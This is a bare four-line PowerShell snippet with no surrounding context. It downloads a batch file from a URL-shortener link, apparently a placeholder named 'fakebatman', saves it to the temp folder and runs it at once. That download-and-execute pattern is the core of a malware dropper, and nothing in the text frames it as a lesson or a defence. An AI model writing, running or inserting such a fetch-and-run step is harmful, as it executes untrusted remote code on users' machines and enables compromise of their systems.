$url = "https://bit.ly/fakebatman"
$output = "$env:temp\downloaded_file.bat"
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process -FilePath $output
